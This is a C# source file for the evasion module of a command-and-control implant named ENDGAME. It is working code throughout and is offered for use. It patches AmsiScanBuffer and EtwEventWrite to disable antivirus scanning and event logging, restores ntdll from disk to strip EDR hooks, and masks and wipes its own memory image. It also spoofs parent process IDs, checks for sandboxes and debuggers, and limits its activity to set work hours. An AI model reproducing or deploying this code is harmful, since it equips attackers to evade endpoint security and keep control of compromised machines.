// AgentEvasion.cs — evasion capabilities for ENDGAME C2 C# agent
// Compiled alongside Agent.cs; no namespace; no external dependencies.

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

// ─── Win32 declarations (evasion-specific; avoids collision with Win32 in Agent.cs) ─────────────

static class Win32E
{
    public const uint PAGE_EXECUTE_READ       = 0x20;
    public const uint PAGE_EXECUTE_READWRITE  = 0x40;
    public const uint PAGE_READWRITE          = 0x04;
    public const uint PAGE_NOACCESS           = 0x01;
    public const uint MEM_COMMIT              = 0x1000;
    public const uint PROCESS_ALL_ACCESS      = 0x1FFFFF;
    public const uint CONTEXT_DEBUG_REGISTERS = 0x00010010;
    public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    public const int  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr  BaseAddress;
        public IntPtr  AllocationBase;
        public uint    AllocationProtect;
        public IntPtr  RegionSize;
        public uint    State;
        public uint    Protect;
        public uint    Type;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORYSTATUSEX
    {
        public uint  dwLength;
        public uint  dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    // x64 CONTEXT (partial — debug registers only; must be 16-byte aligned)
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT64
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint  ContextFlags;
        public uint  MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint  EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        // remaining fields omitted — we only need debug registers
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 232)]
        public byte[] _rest;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct STARTUPINFO
    {
        public int    cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int    dwProcessId, dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int VirtualQuery(IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32", SetLastError = true)]
    public static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool GetDiskFreeSpaceEx(string lpDirectoryName,
        out ulong lpFreeBytesAvailable, out ulong lpTotalNumberOfBytes, out ulong lpTotalNumberOfFreeBytes);

    [DllImport("kernel32.dll")]
    public static extern ulong GetTickCount64();

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList,
        int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags,
        IntPtr Attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll")]
    public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}

// ─── Evasion class ───────────────────────────────────────────────────────────────────────────────

static class Evasion
{
    // Work-hours state
    static TimeSpan _workStart = TimeSpan.Zero;
    static TimeSpan _workEnd   = TimeSpan.Zero;
    // Sleep-mask state
    static uint _originalProtect = 0;
    static bool _sleepMaskOn = false;
    // DNS canary
    static string _canaryDomain = "";

    // ── 1. AMSI Patch ──────────────────────────────────────────────────────────
    public static string PatchAmsi(string args)
    {
        try
        {
            var hAmsi = Win32E.LoadLibrary("amsi.dll");
            if (hAmsi == IntPtr.Zero) return "[-] amsi.dll not loaded";
            var fn = Win32E.GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (fn == IntPtr.Zero) return "[-] AmsiScanBuffer not found";
            // mov eax,0x80070057 (E_INVALIDARG); ret
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            uint old;
            Win32E.VirtualProtect(fn, (UIntPtr)patch.Length, Win32E.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, fn, patch.Length);
            Win32E.VirtualProtect(fn, (UIntPtr)patch.Length, old, out old);
            return "[+] AMSI patched (AmsiScanBuffer → E_INVALIDARG)";
        }
        catch (Exception ex) { return "[-] AMSI patch failed: " + ex.Message; }
    }

    // ── 2. ETW Patch ───────────────────────────────────────────────────────────
    public static string PatchEtw()
    {
        try
        {
            var hNtdll = Win32E.GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) return "[-] ntdll.dll not found";
            var fn = Win32E.GetProcAddress(hNtdll, "EtwEventWrite");
            if (fn == IntPtr.Zero) return "[-] EtwEventWrite not found";
            byte[] patch = { 0xC3 }; // ret
            uint old;
            Win32E.VirtualProtect(fn, (UIntPtr)1, Win32E.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, fn, 1);
            Win32E.VirtualProtect(fn, (UIntPtr)1, old, out old);
            return "[+] ETW patched (EtwEventWrite → ret)";
        }
        catch (Exception ex) { return "[-] ETW patch failed: " + ex.Message; }
    }

    // ── 3. NTDLL Unhook ────────────────────────────────────────────────────────
    public static string UnhookNtdll()
    {
        try
        {
            string ntdllPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System), "ntdll.dll");
            byte[] disk = File.ReadAllBytes(ntdllPath);

            // Parse PE to find .text section
            int e_lfanew = BitConverter.ToInt32(disk, 0x3C);
            int sectionCount = BitConverter.ToInt16(disk, e_lfanew + 6);
            int optHdrSize  = BitConverter.ToInt16(disk, e_lfanew + 20);
            int sectionBase = e_lfanew + 24 + optHdrSize;

            uint textRVA = 0, textRaw = 0, textSize = 0;
            for (int i = 0; i < sectionCount; i++)
            {
                int off = sectionBase + i * 40;
                string name = Encoding.ASCII.GetString(disk, off, 8).TrimEnd('\0');
                if (name == ".text")
                {
                    textSize = BitConverter.ToUInt32(disk, off + 16);
                    textRaw  = BitConverter.ToUInt32(disk, off + 20);
                    textRVA  = BitConverter.ToUInt32(disk, off + 12);
                    break;
                }
            }
            if (textRVA == 0) return "[-] .text section not found in ntdll.dll";

            IntPtr hNtdll  = Win32E.GetModuleHandle("ntdll.dll");
            IntPtr textDst = new IntPtr(hNtdll.ToInt64() + textRVA);

            uint old;
            Win32E.VirtualProtect(textDst, (UIntPtr)textSize, Win32E.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(disk, (int)textRaw, textDst, (int)textSize);
            Win32E.VirtualProtect(textDst, (UIntPtr)textSize, old, out old);
            return "[+] NTDLL .text section restored from disk (" + textSize + " bytes)";
        }
        catch (Exception ex) { return "[-] NTDLL unhook failed: " + ex.Message; }
    }

    // ── 4. Apply all evasion at once ───────────────────────────────────────────
    public static string ApplyEvasion()
    {
        var sb = new StringBuilder();
        sb.AppendLine(PatchAmsi(""));
        sb.AppendLine(PatchEtw());
        sb.AppendLine(UnhookNtdll());
        return sb.ToString().TrimEnd();
    }

    // ── 5. Sleep Mask ──────────────────────────────────────────────────────────
    public static string SetSleepMask(bool enable)
    {
        try
        {
            IntPtr hMod = Win32E.GetModuleHandle(null);
            Win32E.MEMORY_BASIC_INFORMATION mbi;
            Win32E.VirtualQuery(hMod, out mbi, Marshal.SizeOf(typeof(Win32E.MEMORY_BASIC_INFORMATION)));
            UIntPtr regionSize = (UIntPtr)mbi.RegionSize.ToInt64();

            if (enable)
            {
                Win32E.VirtualProtect(hMod, regionSize, Win32E.PAGE_NOACCESS, out _originalProtect);
                _sleepMaskOn = true;
                return "[+] Sleep mask ON — module pages set to NOACCESS";
            }
            else
            {
                uint dummy;
                uint restore = _originalProtect != 0 ? _originalProtect : Win32E.PAGE_EXECUTE_READ;
                Win32E.VirtualProtect(hMod, regionSize, restore, out dummy);
                _sleepMaskOn = false;
                return "[+] Sleep mask OFF — module pages restored";
            }
        }
        catch (Exception ex) { return "[-] Sleep mask failed: " + ex.Message; }
    }

    // ── 6. PE Header Wipe ──────────────────────────────────────────────────────
    public static string WipePeHeader()
    {
        try
        {
            IntPtr hMod = Win32E.GetModuleHandle(null);
            uint old;
            Win32E.VirtualProtect(hMod, (UIntPtr)4096, Win32E.PAGE_READWRITE, out old);
            byte[] zeros = new byte[4096];
            Marshal.Copy(zeros, 0, hMod, 4096);
            Win32E.VirtualProtect(hMod, (UIntPtr)4096, old, out old);
            return "[+] PE header wiped (first 4096 bytes zeroed)";
        }
        catch (Exception ex) { return "[-] PE wipe failed: " + ex.Message; }
    }

    // ── 7. Clear HWBP on current thread ────────────────────────────────────────
    public static string ClearHwbp()
    {
        try
        {
            IntPtr hThread = Win32E.GetCurrentThread();
            var ctx = new Win32E.CONTEXT64();
            ctx.ContextFlags = Win32E.CONTEXT_DEBUG_REGISTERS;
            ctx._rest = new byte[232];
            if (!Win32E.GetThreadContext(hThread, ref ctx))
                return "[-] GetThreadContext failed: " + Marshal.GetLastWin32Error();
            ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr6 = ctx.Dr7 = 0;
            if (!Win32E.SetThreadContext(hThread, ref ctx))
                return "[-] SetThreadContext failed: " + Marshal.GetLastWin32Error();
            return "[+] HWBP cleared on current thread (DR0-DR7 zeroed)";
        }
        catch (Exception ex) { return "[-] HWBP clear failed: " + ex.Message; }
    }

    // ── 8. PPID Spoof ──────────────────────────────────────────────────────────
    public static string SpawnWithPpid(string args)
    {
        // args: "<ppid_or_name> <cmdline>"
        try
        {
            string[] parts = args.Split(new[]{' '}, 2);
            if (parts.Length < 2) return "[-] Usage: ppid-spoof <pid|procname> <cmdline>";
            string ppidArg = parts[0];
            string cmdline = parts[1];

            int ppid;
            if (!int.TryParse(ppidArg, out ppid))
            {
                var procs = Process.GetProcessesByName(ppidArg);
                if (procs.Length == 0) return "[-] Process not found: " + ppidArg;
                ppid = procs[0].Id;
            }

            IntPtr hParent = Win32E.OpenProcess(Win32E.PROCESS_ALL_ACCESS, false, ppid);
            if (hParent == IntPtr.Zero) return "[-] OpenProcess failed: " + Marshal.GetLastWin32Error();

            // Allocate attribute list
            IntPtr lpSize = IntPtr.Zero;
            Win32E.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            IntPtr attrList = Marshal.AllocHGlobal(lpSize);
            Win32E.InitializeProcThreadAttributeList(attrList, 1, 0, ref lpSize);

            IntPtr hParentVal = hParent;
            Win32E.UpdateProcThreadAttribute(attrList, 0,
                new IntPtr(Win32E.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                ref hParentVal, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            var si = new Win32E.STARTUPINFOEX();
            si.StartupInfo.cb = Marshal.SizeOf(typeof(Win32E.STARTUPINFOEX));
            si.lpAttributeList = attrList;

            Win32E.PROCESS_INFORMATION pi;
            bool ok = Win32E.CreateProcess(null, cmdline,
                IntPtr.Zero, IntPtr.Zero, false,
                Win32E.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi);

            Win32E.DeleteProcThreadAttributeList(attrList);
            Marshal.FreeHGlobal(attrList);
            Win32E.CloseHandle(hParent);

            if (!ok) return "[-] CreateProcess failed: " + Marshal.GetLastWin32Error();
            Win32E.CloseHandle(pi.hThread);
            Win32E.CloseHandle(pi.hProcess);
            return string.Format("[+] Spawned PID {0} with PPID {1}", pi.dwProcessId, ppid);
        }
        catch (Exception ex) { return "[-] PPID spoof failed: " + ex.Message; }
    }

    // ── 9. Hook Check ──────────────────────────────────────────────────────────
    public static string CheckHooks()
    {
        var sb = new StringBuilder();
        try
        {
            IntPtr hNtdll = Win32E.GetModuleHandle("ntdll.dll");
            // Parse export table
            int e_lfanew = Marshal.ReadInt32(hNtdll, 0x3C);
            // DataDirectory[0] = export dir, offset from optional header start
            // PE32+: optional header at e_lfanew+24, DataDirectory at +112
            int exportDirRVA = Marshal.ReadInt32(hNtdll, e_lfanew + 24 + 112);
            if (exportDirRVA == 0) { sb.AppendLine("[-] No export directory"); goto hwbp; }

            IntPtr exportDir = new IntPtr(hNtdll.ToInt64() + exportDirRVA);
            int numNames    = Marshal.ReadInt32(exportDir, 24);
            int namesRVA    = Marshal.ReadInt32(exportDir, 32);
            int funcsRVA    = Marshal.ReadInt32(exportDir, 28);
            int ordsRVA     = Marshal.ReadInt32(exportDir, 36);

            int hooked = 0;
            for (int i = 0; i < numNames; i++)
            {
                int nameRVA = Marshal.ReadInt32(hNtdll, namesRVA + i * 4);
                string name = Marshal.PtrToStringAnsi(new IntPtr(hNtdll.ToInt64() + nameRVA));
                if (name == null || (!name.StartsWith("Nt") && !name.StartsWith("Zw"))) continue;
                short ord = Marshal.ReadInt16(hNtdll, ordsRVA + i * 2);
                int funcRVA = Marshal.ReadInt32(hNtdll, funcsRVA + ord * 4);
                IntPtr fn = new IntPtr(hNtdll.ToInt64() + funcRVA);
                byte first = Marshal.ReadByte(fn);
                if (first == 0xE9 || first == 0xCC)
                {
                    sb.AppendLine(string.Format("  [!] HOOKED: {0} (byte=0x{1:X2})", name, first));
                    hooked++;
                }
            }
            if (hooked == 0) sb.AppendLine("[+] No hooks detected in ntdll Nt/Zw exports");
            else sb.AppendLine(string.Format("[!] {0} hook(s) detected", hooked));
        }
        catch (Exception ex) { sb.AppendLine("[-] Hook scan error: " + ex.Message); }

        hwbp:
        try
        {
            IntPtr hThread = Win32E.GetCurrentThread();
            var ctx = new Win32E.CONTEXT64();
            ctx.ContextFlags = Win32E.CONTEXT_DEBUG_REGISTERS;
            ctx._rest = new byte[232];
            Win32E.GetThreadContext(hThread, ref ctx);
            if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0)
                sb.AppendLine(string.Format("[!] HWBP active: DR0={0:X} DR1={1:X} DR2={2:X} DR3={3:X}",
                    ctx.Dr0, ctx.Dr1, ctx.Dr2, ctx.Dr3));
            else
                sb.AppendLine("[+] No hardware breakpoints set");
        }
        catch (Exception ex) { sb.AppendLine("[-] HWBP check error: " + ex.Message); }

        return sb.ToString().TrimEnd();
    }

    // ── 10. Anti-Sandbox ───────────────────────────────────────────────────────
    public static string AntiSandbox()
    {
        var sb = new StringBuilder();
        int score = 0;

        // CPU count
        int cpus = Environment.ProcessorCount;
        if (cpus < 2) { sb.AppendLine("  [!] CPU count: " + cpus + " (<2) +2"); score += 2; }
        else sb.AppendLine("  [+] CPU count: " + cpus);

        // RAM
        try
        {
            var mem = new Win32E.MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf(typeof(Win32E.MEMORYSTATUSEX)) };
            Win32E.GlobalMemoryStatusEx(ref mem);
            ulong ramGB = mem.ullTotalPhys / (1024*1024*1024);
            if (ramGB < 2) { sb.AppendLine("  [!] RAM: " + ramGB + " GB (<2) +2"); score += 2; }
            else sb.AppendLine("  [+] RAM: " + ramGB + " GB");
        }
        catch { sb.AppendLine("  [?] RAM check failed"); }

        // Disk
        try
        {
            ulong free, total, totalFree;
            Win32E.GetDiskFreeSpaceEx(@"C:\", out free, out total, out totalFree);
            ulong diskGB = total / (1024*1024*1024);
            if (diskGB < 60) { sb.AppendLine("  [!] Disk: " + diskGB + " GB (<60) +2"); score += 2; }
            else sb.AppendLine("  [+] Disk: " + diskGB + " GB");
        }
        catch { sb.AppendLine("  [?] Disk check failed"); }

        // Username
        string user = Environment.UserName.ToLowerInvariant();
        string[] sandboxUsers = {"sandbox","virus","malware","test","admin","user","john","analyst","sample","vboxuser","cuckoo","vmware"};
        bool badUser = false;
        foreach (var u in sandboxUsers) if (user == u) { badUser = true; break; }
        if (badUser) { sb.AppendLine("  [!] Username: '" + user + "' (sandbox-like) +1"); score += 1; }
        else sb.AppendLine("  [+] Username: " + user);

        // Uptime
        ulong uptimeMs = Win32E.GetTickCount64();
        double uptimeMin = uptimeMs / 60000.0;
        if (uptimeMin < 5) { sb.AppendLine(string.Format("  [!] Uptime: {0:F1} min (<5) +2", uptimeMin)); score += 2; }
        else sb.AppendLine(string.Format("  [+] Uptime: {0:F1} min", uptimeMin));

        // Process count
        int procCount = Process.GetProcesses().Length;
        if (procCount < 20) { sb.AppendLine("  [!] Process count: " + procCount + " (<20) +1"); score += 1; }
        else sb.AppendLine("  [+] Process count: " + procCount);

        sb.Insert(0, string.Format("Sandbox score: {0}/10\n", score));
        if (score >= 4) sb.AppendLine("\n[!] HIGH sandbox probability");
        else if (score >= 2) sb.AppendLine("\n[~] Moderate sandbox probability");
        else sb.AppendLine("\n[+] Low sandbox probability");

        return sb.ToString().TrimEnd();
    }

    // ── 11. Work Hours ─────────────────────────────────────────────────────────
    public static string SetWorkHours(string args)
    {
        // args: "HH:MM HH:MM"
        try
        {
            string[] parts = args.Trim().Split(' ');
            if (parts.Length < 2) return "[-] Usage: work-hours <HH:MM> <HH:MM>";
            _workStart = TimeSpan.Parse(parts[0]);
            _workEnd   = TimeSpan.Parse(parts[1]);
            return string.Format("[+] Work hours set: {0} – {1}", parts[0], parts[1]);
        }
        catch (Exception ex) { return "[-] Invalid time format: " + ex.Message; }
    }

    public static void EnforceWorkHours()
    {
        if (_workStart == _workEnd) return;
        TimeSpan now = DateTime.Now.TimeOfDay;
        bool inWindow = _workStart <= _workEnd
            ? (now >= _workStart && now <= _workEnd)
            : (now >= _workStart || now <= _workEnd);
        if (!inWindow)
        {
            TimeSpan sleepFor;
            if (now < _workStart) sleepFor = _workStart - now;
            else sleepFor = TimeSpan.FromHours(24) - now + _workStart;
            Thread.Sleep((int)sleepFor.TotalMilliseconds);
        }
    }

    // ── 12. DNS Canary ─────────────────────────────────────────────────────────
    public static string SetDnsCanary(string domain)
    {
        if (string.IsNullOrEmpty(domain)) return "[-] Usage: dns-canary <domain>";
        _canaryDomain = domain.Trim();
        try
        {
            Dns.GetHostEntry(_canaryDomain);
            return "[!] WARNING: canary domain '" + _canaryDomain + "' resolves — host may be monitored/burned";
        }
        catch
        {
            return "[+] Canary set: " + _canaryDomain + " (not currently resolving)";
        }
    }

    public static void CheckDnsCanary()
    {
        if (string.IsNullOrEmpty(_canaryDomain)) return;
        try { Dns.GetHostEntry(_canaryDomain); Environment.Exit(0); } catch { }
    }
}
